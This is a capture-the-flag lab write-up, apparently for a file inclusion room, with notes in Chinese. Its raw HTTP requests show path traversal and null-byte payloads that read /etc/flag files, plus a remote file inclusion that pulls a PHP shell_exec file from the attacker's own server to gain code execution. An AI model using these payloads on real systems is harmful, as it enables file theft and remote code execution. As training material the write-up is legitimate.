# Challenge
## Capture Flag1 at /etc/flag1
### 1. Capture Flag1 at /etc/flag1
```sh
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.212.172
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.212.172/challenges/chall1.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 26

file=../../../../etc/flag1
```

注意点:
* GET 请求修改为 POST 时，请求携带参数 `file` 要放在 Request body 内，不要放在 URL 中(原因：这是 HTTP 协议标准的约定，POST 用于提交数据，因此应放在请求体中，否则服务端很可能不会接收或解析 URL 中的参数)
* GET 请求修改为 POST 时，要添加 `Content-Type: application/x-www-form-urlencoded`(原因：这是标准 HTML 表单 POST 的默认编码方式。服务器使用这个头部信息来解析请求体的数据格式，否则可能无法正确读取 `file=` 这个字段)
* .目录跳转层级计算:
    ```sh
    ../     → /var/www/html/challenges/      → /var/www/html
    ../     → /var/www/html                  → /var/www
    ../     → /var/www                       → /
    ../     → /                              → done
    /etc/flag1 → ✅ 找到了
    ```


### 2. Capture Flag2 at /etc/flag2
```sh
GET /challenges/chall2.php HTTP/1.1
Host: 10.10.212.172
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.212.172/challenges/index.php
Accept-Encoding: gzip, deflate, br
Cookie: THM=../../../../etc/flag2%00
Connection: keep-alive
```

注意点:
* 在 `PHP ≤ 5.3` 中，`%00` 可能被当作 `null` 字节，成功触发路径截断，特别是在文件函数如 `include()`、`fopen()`、`file_get_contents()` 中


### ⭐️3. Capture Flag3 at /etc/flag3
```sh
POST /challenges/chall3.php HTTP/1.1
Host: 10.10.219.179
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.219.179/challenges/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 29

file=../../../../etc/flag3%00
```

提示&注意点:
* [Hint #1] Not everything is filtered! 
* [Hint #2] The website uses $_REQUESTS to accept HTTP requests. Do research to understand it and what it accepts!
* `$_REQUEST` 是 PHP 提供的一个超全局变量，它可以自动收集来自下述三种来源的数据，值得注意的是如果你无法看到源代码，则只能策略来“`盲测`”是否使用了 $_REQUEST：
    * $_GET（URL 参数）
    * $_POST（表单或 Body 数据）
    * $_COOKIE（浏览器中的 Cookie）


### 4. Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
```sh
GET /playground.php?file=http://10.14.103.246:8888/malicious.php HTTP/1.1
Host: 10.10.212.172
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.212.172/playground.php?file=http%3A%2F%2F10.14.103.246%3A8888%2Fmalicious.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```sh
# malicious.php
<?php
echo shell_exec('hostname');
?>
```

注意点:
* .利用 `python3 -m http.server port_number` 在本地存放 `malicious.php` 的文件夹下搭建服务器
* .使用连接 `OpenVPN` 后其提供的公网 IP